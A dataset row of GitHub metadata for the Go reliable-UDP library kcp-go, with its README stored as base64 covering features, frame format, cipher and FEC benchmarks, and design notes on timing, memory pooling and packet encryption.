b'kcp-go',37511821,"b' A Crypto-Secure, Production-Grade Reliable-UDP Library for golang with FEC '",b'Go',14,2377,,2377,False,b'https://api.github.com/repos/xtaci/kcp-go/forks',"PGltZyBzcmM9ImtjcC1nby5wbmciIGFsdD0ia2NwLWdvIiBoZWlnaHQ9IjUw
cHgiIC8+CgoKWyFbR29Eb2NdWzFdXVsyXSBbIVtQb3dlcmVkXVs5XV1bMTBd
IFshW01JVCBsaWNlbnNlZF1bMTFdXVsxMl0gWyFbQnVpbGQgU3RhdHVzXVsz
XV1bNF0gWyFbR28gUmVwb3J0IENhcmRdWzVdXVs2XSBbIVtDb3ZlcmFnZSBT
dGF0dXNkXVs3XV1bOF0KClsxXTogaHR0cHM6Ly9nb2RvYy5vcmcvZ2l0aHVi
LmNvbS94dGFjaS9rY3AtZ28/c3RhdHVzLnN2ZwpbMl06IGh0dHBzOi8vZ29k
b2Mub3JnL2dpdGh1Yi5jb20veHRhY2kva2NwLWdvClszXTogaHR0cHM6Ly90
cmF2aXMtY2kub3JnL3h0YWNpL2tjcC1nby5zdmc/YnJhbmNoPW1hc3Rlcgpb
NF06IGh0dHBzOi8vdHJhdmlzLWNpLm9yZy94dGFjaS9rY3AtZ28KWzVdOiBo
dHRwczovL2dvcmVwb3J0Y2FyZC5jb20vYmFkZ2UvZ2l0aHViLmNvbS94dGFj
aS9rY3AtZ28KWzZdOiBodHRwczovL2dvcmVwb3J0Y2FyZC5jb20vcmVwb3J0
L2dpdGh1Yi5jb20veHRhY2kva2NwLWdvCls3XTogaHR0cHM6Ly9jb2RlY292
LmlvL2doL3h0YWNpL2tjcC1nby9icmFuY2gvbWFzdGVyL2dyYXBoL2JhZGdl
LnN2ZwpbOF06IGh0dHBzOi8vY29kZWNvdi5pby9naC94dGFjaS9rY3AtZ28K
WzldOiBodHRwczovL2ltZy5zaGllbGRzLmlvL2JhZGdlL0tDUC1Qb3dlcmVk
LWJsdWUuc3ZnClsxMF06IGh0dHBzOi8vZ2l0aHViLmNvbS9za3l3aW5kMzAw
MC9rY3AKWzExXTogaHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9iYWRnZS9saWNl
bnNlLU1JVC1ibHVlLnN2ZwpbMTJdOiBMSUNFTlNFCgojIyBJbnRyb2R1Y3Rp
b24KCioqa2NwLWdvKiogaXMgYSAqKlByb2R1Y3Rpb24tR3JhZGUgUmVsaWFi
bGUtVURQKiogbGlicmFyeSBmb3IgW2dvbGFuZ10oaHR0cHM6Ly9nb2xhbmcu
b3JnLykuIAoKVGhpcyBsaWJyYXJ5IGludGVudHMgdG8gcHJvdmlkZSBhICoq
c21vb3RoLCByZXNpbGllbnQsIG9yZGVyZWQsIGVycm9yLWNoZWNrZWQgYW5k
IGFub255bW91cyoqIGRlbGl2ZXJ5IG9mIHN0cmVhbXMgb3ZlciAqKlVEUCoq
IHBhY2tldHMsIGl0IGhhcyBiZWVuIGJhdHRsZS10ZXN0ZWQgd2l0aCBvcGVu
c291cmNlIHByb2plY3QgW2tjcHR1bl0oaHR0cHM6Ly9naXRodWIuY29tL3h0
YWNpL2tjcHR1bikuIE1pbGxpb25zIG9mIGRldmljZXMoZnJvbSBsb3ctZW5k
IE1JUFMgcm91dGVycyB0byBoaWdoLWVuZCBzZXJ2ZXJzKSBoYXZlIGRlcGxv
eWVkICoqa2NwLWdvKiogcG93ZXJlZCBwcm9ncmFtIGluIGEgdmFyaWV0eSBv
ZiBmb3JtcyBsaWtlICoqb25saW5lIGdhbWVzLCBsaXZlIGJyb2FkY2FzdGlu
ZywgZmlsZSBzeW5jaHJvbml6YXRpb24gYW5kIG5ldHdvcmsgYWNjZWxlcmF0
aW9uKiouCgpbTGFzdGVzdCBSZWxlYXNlXShodHRwczovL2dpdGh1Yi5jb20v
eHRhY2kva2NwLWdvL3JlbGVhc2VzKQoKIyMgRmVhdHVyZXMKCjEuIERlc2ln
bmVkIGZvciAqKkxhdGVuY3ktc2Vuc2l0aXZlKiogc2NlbmFyaW9zLgoxLiAq
KkNhY2hlIGZyaWVuZGx5KiogYW5kICoqTWVtb3J5IG9wdGltaXplZCoqIGRl
c2lnbiwgb2ZmZXJzIGV4dHJlbWVseSAqKkhpZ2ggUGVyZm9ybWFuY2UqKiBj
b3JlLgoxLiBIYW5kbGVzICoqPjVLIGNvbmN1cnJlbnQgY29ubmVjdGlvbnMq
KiBvbiBhIHNpbmdsZSBjb21tb2RpdHkgc2VydmVyLgoxLiBDb21wYXRpYmxl
IHdpdGggW25ldC5Db25uXShodHRwczovL2dvbGFuZy5vcmcvcGtnL25ldC8j
Q29ubikgYW5kIFtuZXQuTGlzdGVuZXJdKGh0dHBzOi8vZ29sYW5nLm9yZy9w
a2cvbmV0LyNMaXN0ZW5lciksIGEgZHJvcC1pbiByZXBsYWNlbWVudCBmb3Ig
W25ldC5UQ1BDb25uXShodHRwczovL2dvbGFuZy5vcmcvcGtnL25ldC8jVENQ
Q29ubikuCjEuIFtGRUMoRm9yd2FyZCBFcnJvciBDb3JyZWN0aW9uKV0oaHR0
cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvRm9yd2FyZF9lcnJvcl9jb3Jy
ZWN0aW9uKSBTdXBwb3J0IHdpdGggW1JlZWQtU29sb21vbiBDb2Rlc10oaHR0
cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvUmVlZCVFMiU4MCU5M1NvbG9t
b25fZXJyb3JfY29ycmVjdGlvbikKMS4gUGFja2V0IGxldmVsIGVuY3J5cHRp
b24gc3VwcG9ydCB3aXRoIFtBRVNdKGh0dHBzOi8vZW4ud2lraXBlZGlhLm9y
Zy93aWtpL0FkdmFuY2VkX0VuY3J5cHRpb25fU3RhbmRhcmQpLCBbVEVBXSho
dHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9UaW55X0VuY3J5cHRpb25f
QWxnb3JpdGhtKSwgWzNERVNdKGh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93
aWtpL1RyaXBsZV9ERVMpLCBbQmxvd2Zpc2hdKGh0dHBzOi8vZW4ud2lraXBl
ZGlhLm9yZy93aWtpL0Jsb3dmaXNoXyhjaXBoZXIpKSwgW0Nhc3Q1XShodHRw
czovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9DQVNULTEyOCksIFtTYWxzYTIw
XSggaHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvU2Fsc2EyMCksIGV0
Yy4gaW4gW0NGQl0oaHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvQmxv
Y2tfY2lwaGVyX21vZGVfb2Zfb3BlcmF0aW9uI0NpcGhlcl9GZWVkYmFja18u
MjhDRkIuMjkpIG1vZGUsIHdoaWNoIGdlbmVyYXRlcyBjb21wbGV0ZWx5IGFu
b255bW91cyBwYWNrZXQuCjEuIE9ubHkgKipBIGZpeGVkIG51bWJlciBvZiBn
b3JvdXRpbmVzKiogd2lsbCBiZSBjcmVhdGVkIGZvciB0aGUgZW50aXJlIHNl
cnZlciBhcHBsaWNhdGlvbiwgY29zdHMgaW4gKipjb250ZXh0IHN3aXRjaCoq
IGJldHdlZW4gZ29yb3V0aW5lcyBoYXZlIGJlZW4gdGFrZW4gaW50byBjb25z
aWRlcmF0aW9uLgoxLiBDb21wYXRpYmxlIHdpdGggW3NreXdpbmQzMDAwJ3Nd
KGh0dHBzOi8vZ2l0aHViLmNvbS9za3l3aW5kMzAwMCkgQyB2ZXJzaW9uIHdp
dGggdmFyaW91cyBpbXByb3ZlbWVudHMuCjEuIFBsYXRmb3JtLWRlcGVuZGVu
dCBvcHRpbWl6YXRpb25zOiBbc2VuZG1tc2ddKGh0dHA6Ly9tYW43Lm9yZy9s
aW51eC9tYW4tcGFnZXMvbWFuMi9zZW5kbW1zZy4yLmh0bWwpIGFuZCBbcmVj
dm1tc2ddKGh0dHA6Ly9tYW43Lm9yZy9saW51eC9tYW4tcGFnZXMvbWFuMi9y
ZWN2bW1zZy4yLmh0bWwpIHdlcmUgZXhwb2xvaXRlZCBmb3IgbGludXguCgoj
IyBEb2N1bWVudGF0aW9uCgpGb3IgY29tcGxldGUgZG9jdW1lbnRhdGlvbiwg
c2VlIHRoZSBhc3NvY2lhdGVkIFtHb2RvY10oaHR0cHM6Ly9nb2RvYy5vcmcv
Z2l0aHViLmNvbS94dGFjaS9rY3AtZ28pLgoKIyMgU3BlY2lmaWNhdGlvbgoK
PGltZyBzcmM9ImZyYW1lLnBuZyIgYWx0PSJGcmFtZSBGb3JtYXQiIGhlaWdo
dD0iMTA5cHgiIC8+CgpgYGAKTk9OQ0U6CiAgMTZieXRlcyBjcnlwdG9ncmFw
aGljYWxseSBzZWN1cmUgcmFuZG9tIG51bWJlciwgbm9uY2UgY2hhbmdlcyBm
b3IgZXZlcnkgcGFja2V0LgogIApDUkMzMjoKICBDUkMtMzIgY2hlY2tzdW0g
b2YgZGF0YSB1c2luZyB0aGUgSUVFRSBwb2x5bm9taWFsCiAKRkVDIFRZUEU6
CiAgdHlwZURhdGEgPSAweEYxCiAgdHlwZVBhcml0eSA9IDB4RjIKICAKRkVD
IFNFUUlEOgogIG1vbm90b25pY2FsbHkgaW5jcmVhc2luZyBpbiByYW5nZTog
WzAsICgweGZmZmZmZmZmL3NoYXJkU2l6ZSkgKiBzaGFyZFNpemUgLSAxXQog
IApTSVpFOgogIFRoZSBzaXplIG9mIEtDUCBmcmFtZSBwbHVzIDIKYGBgCgpg
YGAKKy0tLS0tLS0tLS0tLS0tLS0tKwp8IFNFU1NJT04gICAgICAgICB8Cist
LS0tLS0tLS0tLS0tLS0tLSsKfCBLQ1AoQVJRKSAgICAgICAgfAorLS0tLS0t
LS0tLS0tLS0tLS0rCnwgRkVDKE9QVElPTkFMKSAgIHwKKy0tLS0tLS0tLS0t
LS0tLS0tKwp8IENSWVBUTyhPUFRJT05BTCl8CistLS0tLS0tLS0tLS0tLS0t
LSsKfCBVRFAoUEFDS0VUKSAgICAgfAorLS0tLS0tLS0tLS0tLS0tLS0rCnwg
SVAgICAgICAgICAgICAgIHwKKy0tLS0tLS0tLS0tLS0tLS0tKwp8IExJTksg
ICAgICAgICAgICB8CistLS0tLS0tLS0tLS0tLS0tLSsKfCBQSFkgICAgICAg
ICAgICAgfAorLS0tLS0tLS0tLS0tLS0tLS0rCihMQVlFUiBNT0RFTCBPRiBL
Q1AtR08pCmBgYAoKCiMjIEV4YW1wbGVzCgoxLiBbc2ltcGxlIGV4YW1wbGVz
XShodHRwczovL2dpdGh1Yi5jb20veHRhY2kva2NwLWdvL3RyZWUvbWFzdGVy
L2V4YW1wbGVzKQoyLiBba2NwdHVuIGNsaWVudF0oaHR0cHM6Ly9naXRodWIu
Y29tL3h0YWNpL2tjcHR1bi9ibG9iL21hc3Rlci9jbGllbnQvbWFpbi5nbykK
My4gW2tjcHR1biBzZXJ2ZXJdKGh0dHBzOi8vZ2l0aHViLmNvbS94dGFjaS9r
Y3B0dW4vYmxvYi9tYXN0ZXIvc2VydmVyL21haW4uZ28pCgojIyBCZW5jaG1h
cmsKYGBgCiAgTW9kZWwgTmFtZToJTWFjQm9vayBQcm8KICBNb2RlbCBJZGVu
dGlmaWVyOglNYWNCb29rUHJvMTQsMQogIFByb2Nlc3NvciBOYW1lOglJbnRl
bCBDb3JlIGk1CiAgUHJvY2Vzc29yIFNwZWVkOgkzLjEgR0h6CiAgTnVtYmVy
IG9mIFByb2Nlc3NvcnM6CTEKICBUb3RhbCBOdW1iZXIgb2YgQ29yZXM6CTIK
ICBMMiBDYWNoZSAocGVyIENvcmUpOgkyNTYgS0IKICBMMyBDYWNoZToJNCBN
QgogIE1lbW9yeToJOCBHQgpgYGAKYGBgCiQgZ28gdGVzdCAtdiAtcnVuPV4k
IC1iZW5jaCAuCmJlZ2lubmluZyB0ZXN0cywgZW5jcnlwdGlvbjpzYWxzYTIw
LCBmZWM6MTAvMwpnb29zOiBkYXJ3aW4KZ29hcmNoOiBhbWQ2NApwa2c6IGdp
dGh1Yi5jb20veHRhY2kva2NwLWdvCkJlbmNobWFya1NNNC00ICAgICAgICAg
ICAgICAgICAJICAgNTAwMDAJICAgICAzMjE4MCBucy9vcAkgIDkzLjIzIE1C
L3MJICAgICAgIDAgQi9vcAkgICAgICAgMCBhbGxvY3Mvb3AKQmVuY2htYXJr
QUVTMTI4LTQgICAgICAgICAgICAgIAkgIDUwMDAwMAkgICAgICAzMjg1IG5z
L29wCSA5MTMuMjEgTUIvcwkgICAgICAgMCBCL29wCSAgICAgICAwIGFsbG9j
cy9vcApCZW5jaG1hcmtBRVMxOTItNCAgICAgICAgICAgICAgCSAgMzAwMDAw
CSAgICAgIDM2MjMgbnMvb3AJIDgyNy44NSBNQi9zCSAgICAgICAwIEIvb3AJ
ICAgICAgIDAgYWxsb2NzL29wCkJlbmNobWFya0FFUzI1Ni00ICAgICAgICAg
ICAgICAJICAzMDAwMDAJICAgICAgMzg3NCBucy9vcAkgNzc0LjIwIE1CL3MJ
ICAgICAgIDAgQi9vcAkgICAgICAgMCBhbGxvY3Mvb3AKQmVuY2htYXJrVEVB
LTQgICAgICAgICAgICAgICAgIAkgIDEwMDAwMAkgICAgIDE1Mzg0IG5zL29w
CSAxOTUuMDAgTUIvcwkgICAgICAgMCBCL29wCSAgICAgICAwIGFsbG9jcy9v
cApCZW5jaG1hcmtYT1ItNCAgICAgICAgICAgICAgICAgCTIwMDAwMDAwCSAg
ICAgICAgODkuOSBucy9vcAkzMzM3Mi4wMCBNQi9zCSAgICAgICAwIEIvb3AJ
ICAgICAgIDAgYWxsb2NzL29wCkJlbmNobWFya0Jsb3dmaXNoLTQgICAgICAg
ICAgICAJICAgNTAwMDAJICAgICAyNjkyNyBucy9vcAkgMTExLjQxIE1CL3MJ
ICAgICAgIDAgQi9vcAkgICAgICAgMCBhbGxvY3Mvb3AKQmVuY2htYXJrTm9u
ZS00ICAgICAgICAgICAgICAgIAkzMDAwMDAwMAkgICAgICAgIDQ1LjcgbnMv
b3AJNjU1OTcuOTQgTUIvcwkgICAgICAgMCBCL29wCSAgICAgICAwIGFsbG9j
cy9vcApCZW5jaG1hcmtDYXN0NS00ICAgICAgICAgICAgICAgCSAgIDUwMDAw
CSAgICAgMzQyNTggbnMvb3AJICA4Ny41NyBNQi9zCSAgICAgICAwIEIvb3AJ
ICAgICAgIDAgYWxsb2NzL29wCkJlbmNobWFyazNERVMtNCAgICAgICAgICAg
ICAgICAJICAgMTAwMDAJICAgIDExNzE0OSBucy9vcAkgIDI1LjYxIE1CL3MJ
ICAgICAgIDAgQi9vcAkgICAgICAgMCBhbGxvY3Mvb3AKQmVuY2htYXJrVHdv
ZmlzaC00ICAgICAgICAgICAgIAkgICA1MDAwMAkgICAgIDMzNTM4IG5zL29w
CSAgODkuNDUgTUIvcwkgICAgICAgMCBCL29wCSAgICAgICAwIGFsbG9jcy9v
cApCZW5jaG1hcmtYVEVBLTQgICAgICAgICAgICAgICAgCSAgIDMwMDAwCSAg
ICAgNDU2NjYgbnMvb3AJICA2NS42OSBNQi9zCSAgICAgICAwIEIvb3AJICAg
ICAgIDAgYWxsb2NzL29wCkJlbmNobWFya1NhbHNhMjAtNCAgICAgICAgICAg
ICAJICA1MDAwMDAJICAgICAgMzMwOCBucy9vcAkgOTA2Ljc2IE1CL3MJICAg
ICAgIDAgQi9vcAkgICAgICAgMCBhbGxvY3Mvb3AKQmVuY2htYXJrQ1JDMzIt
NCAgICAgICAgICAgICAgIAkyMDAwMDAwMAkgICAgICAgIDY1LjIgbnMvb3AJ
MTU3MTIuNDMgTUIvcwpCZW5jaG1hcmtDc3BybmdTeXN0ZW0tNCAgICAgICAg
CSAxMDAwMDAwCSAgICAgIDExNTAgbnMvb3AJICAxMy45MSBNQi9zCkJlbmNo
bWFya0NzcHJuZ01ENS00ICAgICAgICAgICAJMTAwMDAwMDAJICAgICAgIDE0
NSBucy9vcAkgMTEwLjI2IE1CL3MKQmVuY2htYXJrQ3Nwcm5nU0hBMS00ICAg
ICAgICAgIAkxMDAwMDAwMAkgICAgICAgMTU4IG5zL29wCSAxMjYuNTQgTUIv
cwpCZW5jaG1hcmtDc3BybmdOb25jZU1ENS00ICAgICAgCTEwMDAwMDAwCSAg
ICAgICAxNTMgbnMvb3AJIDEwNC4yMiBNQi9zCkJlbmNobWFya0NzcHJuZ05v
bmNlQUVTMTI4LTQgICAJMTAwMDAwMDAwCSAgICAgICAgMTkuMSBucy9vcAkg
ODM3LjgxIE1CL3MKQmVuY2htYXJrRkVDRGVjb2RlLTQgICAgICAgICAgIAkg
MTAwMDAwMAkgICAgICAxMTE5IG5zL29wCTEzMzkuNjEgTUIvcwkgICAgMTYw
NiBCL29wCSAgICAgICAyIGFsbG9jcy9vcApCZW5jaG1hcmtGRUNFbmNvZGUt
NCAgICAgICAgICAgCSAyMDAwMDAwCSAgICAgICA4MzIgbnMvb3AJMTgwMS44
MyBNQi9zCSAgICAgIDE3IEIvb3AJICAgICAgIDAgYWxsb2NzL29wCkJlbmNo
bWFya0ZsdXNoLTQgICAgICAgICAgICAgICAJIDUwMDAwMDAJICAgICAgIDI3
MiBucy9vcAkgICAgICAgMCBCL29wCSAgICAgICAwIGFsbG9jcy9vcApCZW5j
aG1hcmtFY2hvU3BlZWQ0Sy00ICAgICAgICAgCSAgICA1MDAwCSAgICAyNTk2
MTcgbnMvb3AJICAxNS43OCBNQi9zCSAgICA1NDUxIEIvb3AJICAgICAxNDkg
YWxsb2NzL29wCkJlbmNobWFya0VjaG9TcGVlZDY0Sy00ICAgICAgICAJICAg
IDEwMDAJICAgMTcwNjA4NCBucy9vcAkgIDM4LjQxIE1CL3MJICAgNTYwMDIg
Qi9vcAkgICAgMTYwNCBhbGxvY3Mvb3AKQmVuY2htYXJrRWNob1NwZWVkNTEy
Sy00ICAgICAgIAkgICAgIDEwMAkgIDE0MzQ1NTA1IG5zL29wCSAgMzYuNTUg
TUIvcwkgIDQ4MjU5NyBCL29wCSAgIDEzMDQ1IGFsbG9jcy9vcApCZW5jaG1h
cmtFY2hvU3BlZWQxTS00ICAgICAgICAgCSAgICAgIDMwCSAgMzQ4NTkxMDQg
bnMvb3AJICAzMC4wOCBNQi9zCSAxMTQzNzczIEIvb3AJICAgMjcxODYgYWxs
b2NzL29wCkJlbmNobWFya1NpbmtTcGVlZDRLLTQgICAgICAgICAJICAgNTAw
MDAJICAgICAzMTM2OSBucy9vcAkgMTMwLjU3IE1CL3MJICAgIDE1NjYgQi9v
cAkgICAgICAzMCBhbGxvY3Mvb3AKQmVuY2htYXJrU2lua1NwZWVkNjRLLTQg
ICAgICAgIAkgICAgNTAwMAkgICAgMzI5MDY1IG5zL29wCSAxOTkuMTYgTUIv
cwkgICAyMTUyOSBCL29wCSAgICAgNDUzIGFsbG9jcy9vcApCZW5jaG1hcmtT
aW5rU3BlZWQyNTZLLTQgICAgICAgCSAgICAgNTAwCSAgIDIzNzMzNTQgbnMv
b3AJIDIyMC45MSBNQi9zCSAgMTY2MzMyIEIvb3AJICAgIDM1NTQgYWxsb2Nz
L29wCkJlbmNobWFya1NpbmtTcGVlZDFNLTQgICAgICAgICAJICAgICAzMDAJ
ICAgNTExNzkyNyBucy9vcAkgMjA0Ljg4IE1CL3MJICAzMTAzNzggQi9vcAkg
ICAgNjk4OCBhbGxvY3Mvb3AKUEFTUwpvayAgCWdpdGh1Yi5jb20veHRhY2kv
a2NwLWdvCTUwLjM0OXMKYGBgCgoKIyMgVHlwaWNhbCBGbGFtZSBHcmFwaAoh
W0ZsYW1lIEdyYXBoIGluIGtjcHR1bl0oZmxhbWUucG5nKQoKIyMgS2V5IERl
c2lnbiBDb25zaWRlcmF0aW9ucwoKMS4gc2xpY2UgdnMuIGNvbnRhaW5lci9s
aXN0Cgpga2NwLmZsdXNoKClgIGxvb3BzIHRocm91Z2ggdGhlIHNlbmQgcXVl
dWUgZm9yIHJldHJhbnNtaXNzaW9uIGNoZWNraW5nIGZvciBldmVyeSAyMG1z
KGludGVydmFsKS4KCkkndmUgd3JvdGUgYSBiZW5jaG1hcmsgZm9yIGNvbXBh
cmluZyBzZXF1ZW50aWFsIGxvb3AgdGhyb3VnaCAqc2xpY2UqIGFuZCAqY29u
dGFpbmVyL2xpc3QqIGhlcmU6CgpodHRwczovL2dpdGh1Yi5jb20veHRhY2kv
bm90ZXMvYmxvYi9tYXN0ZXIvZ29sYW5nL2JlbmNobWFyazIvY2FjaGVtaXNz
X3Rlc3QuZ28KCmBgYApCZW5jaG1hcmtMb29wU2xpY2UtNCAgIAkyMDAwMDAw
MDAwCSAgICAgICAgIDAuMzkgbnMvb3AKQmVuY2htYXJrTG9vcExpc3QtNCAg
ICAJMTAwMDAwMDAwCSAgICAgICAgNTQuNiBucy9vcApgYGAKCkxpc3Qgc3Ry
dWN0dXJlIGludHJvZHVjZXMgKipoZWF2eSBjYWNoZSBtaXNzZXMqKiBjb21w
YXJlZCB0byBzbGljZSB3aGljaCBvd25zIGJldHRlciAqKmxvY2FsaXR5Kios
IDUwMDAgY29ubmVjdGlvbnMgd2l0aCAzMiB3aW5kb3cgc2l6ZSBhbmQgMjBt
cyBpbnRlcnZhbCB3aWxsIGNvc3QgNnVzLzAuMDMlKGNwdSkgdXNpbmcgc2xp
Y2UsIGFuZCA4Ljdtcy80My41JShjcHUpIGZvciBsaXN0IGZvciBlYWNoIGBr
Y3AuZmx1c2goKWAuCgoyLiBUaW1pbmcgYWNjdXJhY3kgdnMuIHN5c2NhbGwg
Y2xvY2tfZ2V0dGltZQoKVGltaW5nIGlzICoqY3JpdGljYWwqKiB0byAqKlJU
VCBlc3RpbWF0b3IqKiwgaW5hY2N1cmF0ZSB0aW1pbmcgbGVhZHMgdG8gZmFs
c2UgcmV0cmFuc21pc3Npb25zIGluIEtDUCwgYnV0IGNhbGxpbmcgYHRpbWUu
Tm93KClgIGNvc3RzIDQyIGN5Y2xlcygxMC41bnMgb24gNEdIeiBDUFUsIDE1
LjZucyBvbiBteSBNYWNCb29rIFBybyAyLjdHSHopLiAKClRoZSBiZW5jaG1h
cmsgZm9yIHRpbWUuTm93KCkgbGllcyBoZXJlOgoKaHR0cHM6Ly9naXRodWIu
Y29tL3h0YWNpL25vdGVzL2Jsb2IvbWFzdGVyL2dvbGFuZy9iZW5jaG1hcmsy
L3N5c2NhbGxfdGVzdC5nbwoKYGBgCkJlbmNobWFya05vdy00ICAgICAgICAg
CTEwMDAwMDAwMAkgICAgICAgIDE1LjYgbnMvb3AKYGBgCgpJbiBrY3AtZ28s
IGFmdGVyIGVhY2ggYGtjcC5vdXRwdXQoKWAgZnVuY3Rpb24gY2FsbCwgY3Vy
cmVudCBjbG9jayB0aW1lIHdpbGwgYmUgdXBkYXRlZCB1cG9uIHJldHVybiwg
YW5kIGZvciBhIHNpbmdsZSBga2NwLmZsdXNoKClgIG9wZXJhdGlvbiwgY3Vy
cmVudCB0aW1lIHdpbGwgYmUgcXVlcmllZCBmcm9tIHN5c3RlbSBvbmNlLiBG
b3IgbW9zdCBvZiB0aGUgdGltZSwgNTAwMCBjb25uZWN0aW9ucyBjb3N0cyA1
MDAwICogMTUuNm5zID0gNzh1cyhhIGZpeGVkIGNvc3Qgd2hpbGUgbm8gcGFj
a2V0IG5lZWRzIHRvIGJlIHNlbnQpLCBhcyBmb3IgMTBNQi9zIGRhdGEgdHJh
bnNmZXJpbmcgd2l0aCAxNDAwIE1UVSwgYGtjcC5vdXRwdXQoKWAgd2lsbCBi
ZSBjYWxsZWQgYXJvdW5kIDc1MDAgdGltZXMgYW5kIGNvc3RzIDExN3VzIGZv
ciBgdGltZS5Ob3coKWAgaW4gKipldmVyeSBzZWNvbmQqKi4KCjMuIE1lbW9y
eSBtYW5hZ2VtZW50CgpQcmltYXJ5IG1lbW9yeSBhbGxvY2F0aW9uIGFyZSBk
b25lIGZyb20gYSBnbG9iYWwgYnVmZmVyIHBvb2wgeG1pdC5CdWYsIGluIGtj
cC1nbywgd2hlbiB3ZSBuZWVkIHRvIGFsbG9jYXRlIHNvbWUgYnl0ZXMsIHdl
IGNhbiBnZXQgZnJvbSB0aGF0IHBvb2wsIGFuZCBhIGZpeGVkLWNhcGFjaXR5
IDE1MDAgYnl0ZXMobXR1TGltaXQpIHdpbGwgYmUgcmV0dXJuZWQsIHRoZSBy
eCBxdWV1ZSwgdHggcXVldWUgYW5kIGZlYyBxdWV1ZSBhbGwgcmVjZWl2ZSBi
eXRlcyBmcm9tIHRoZXJlLCBhbmQgdGhleSB3aWxsIHJldHVybiB0aGUgYnl0
ZXMgdG8gdGhlIHBvb2wgYWZ0ZXIgdXNpbmcgdG8gcHJldmVudCB1bm5lY2Vz
c2FyeSB6ZXIwaW5nIG9mIGJ5dGVzLiBUaGUgcG9vbCBtZWNoYW5pc20gbWFp
bnRhaW5lZCBhIGhpZ2ggd2F0ZXJtYXJrIGZvciBzbGljZSBvYmplY3RzLCB0
aGVzZSBpbi1mbGlnaHQgb2JqZWN0cyBmcm9tIHRoZSBwb29sIHdpbGwgc3Vy
dml2ZSBmcm9tIHRoZSBwZXJvZGljYWwgZ2FyYmFnZSBjb2xsZWN0aW9uLCBt
ZWFud2hpbGUgdGhlIHBvb2wga2VwdCB0aGUgYWJpbGl0eSB0byByZXR1cm4g
dGhlIG1lbW9yeSB0byBydW50aW1lIGlmIGluIGlkbGUuCgo0LiBJbmZvcm1h
dGlvbiBzZWN1cml0eQoKa2NwLWdvIGlzIHNoaXBwZWQgd2l0aCBidWlsdGlu
IHBhY2tldCBlbmNyeXB0aW9uIHBvd2VyZWQgYnkgdmFyaW91cyBibG9jayBl
bmNyeXB0aW9uIGFsZ29yaXRobXMgYW5kIHdvcmtzIGluIFtDaXBoZXIgRmVl
ZGJhY2sgTW9kZV0oaHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvQmxv
Y2tfY2lwaGVyX21vZGVfb2Zfb3BlcmF0aW9uI0NpcGhlcl9GZWVkYmFja18o
Q0ZCKSksIGZvciBlYWNoIHBhY2tldCB0byBiZSBzZW50LCB0aGUgZW5jcnlw
dGlvbiBwcm9jZXNzIHdpbGwgc3RhcnQgZnJvbSBlbmNyeXB0aW5nIGEgW25v
bmNlXShodHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9DcnlwdG9ncmFw
aGljX25vbmNlKSBmcm9tIHRoZSBbc3lzdGVtIGVudHJvcHldKGh0dHBzOi8v
ZW4ud2lraXBlZGlhLm9yZy93aWtpLy9kZXYvcmFuZG9tKSwgc28gZW5jcnlw
dGlvbiB0byBzYW1lIHBsYWludGV4dHMgbmV2ZXIgbGVhZHMgdG8gYSBzYW1l
IGNpcGhlcnRleHRzIHRoZXJlYWZ0ZXIuCgpUaGUgY29udGVudHMgb2YgdGhl
IHBhY2tldHMgYXJlIGNvbXBsZXRlbHkgYW5vbnltb3VzIHdpdGggZW5jcnlw
dGlvbiwgaW5jbHVkaW5nIHRoZSBoZWFkZXJzKEZFQyxLQ1ApLCBjaGVja3N1
bXMgYW5kIGNvbnRlbnRzLiBOb3RlIHRoYXQsIG5vIG1hdHRlciB3aGljaCBl
bmNyeXB0aW9uIG1ldGhvZCB5b3UgY2hvb3NlIG9uIHlvdSB1cHBlciBsYXll
ciwgaWYgeW91IGRpc2FibGUgZW5jcnlwdGlvbiwgdGhlIHRyYW5zbWl0IHdp
bGwgYmUgaW5zZWN1cmUgc29tZWhvdywgc2luY2UgdGhlIGhlYWRlciBpcyAq
KipQTEFJTlRFWFQqKiogdG8gZXZlcnlvbmUgaXQgd291bGQgYmUgc3VzY2Vw
dGlibGUgdG8gaGVhZGVyIHRhbXBlcmluZywgc3VjaCBhcyBqYW1taW5nIHRo
ZSAqc2xpZGluZyB3aW5kb3cgc2l6ZSosICpyb3VuZC10cmlwIHRpbWUqLCAq
RkVDIHByb3BlcnR5KiBhbmQgKmNoZWNrc3VtcyouIGBgYEFFUy0xMjhgYGAg
aXMgc3VnZ2VzdGVkIGZvciBtaW5pbWFsIGVuY3J5cHRpb24gc2luY2UgbW9k
ZXJuIENQVXMgYXJlIHNoaXBwZWQgd2l0aCBbQUVTLU5JXShodHRwczovL2Vu
Lndpa2lwZWRpYS5vcmcvd2lraS9BRVNfaW5zdHJ1Y3Rpb25fc2V0KSBpbnN0
cnVjdGlvbnMgYW5kIHBlcmZvcm1zIGV2ZW4gYmV0dGVyIHRoYW4gYHNhbHNh
MjBgKGNoZWNrIHRoZSB0YWJsZSBhYm92ZSkuCgpPdGhlciBwb3NzaWJsZSBh
dHRhY2tzIHRvIGtjcC1nbyBpbmNsdWRlczogYSkgW3RyYWZmaWMgYW5hbHlz
aXNdKGh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL1RyYWZmaWNfYW5h
bHlzaXMpLCBkYXRhZmxvdyBvbiBzcGVjaWZpYyB3ZWJzaXRlcyBtYXkgaGF2
ZSBwYXR0ZXJuIHdoaWxlIGludGVyY2hhbmdpbmcgZGF0YSwgYnV0IHRoaXMg
dHlwZSBvZiBlYXZlc2Ryb3BwaW5nIGhhcyBiZWVuIG1pdGlnYXRlZCBieSBh
ZGFwdGluZyBbc211eF0oaHR0cHM6Ly9naXRodWIuY29tL3h0YWNpL3NtdXgp
IHRvIG1peCBkYXRhIHN0cmVhbXMgc28gYXMgdG8gaW50cm9kdWNlIG5vaXNl
cywgcGVyZmVjdCBzb2x1dGlvbiB0byB0aGlzIGhhcyBub3QgYXBwZWFyZWQg
eWV0LCB0aGVyb3JldGljYWxseSBieSBzaHVmZmxpbmcvbWl4aW5nIG1lc3Nh
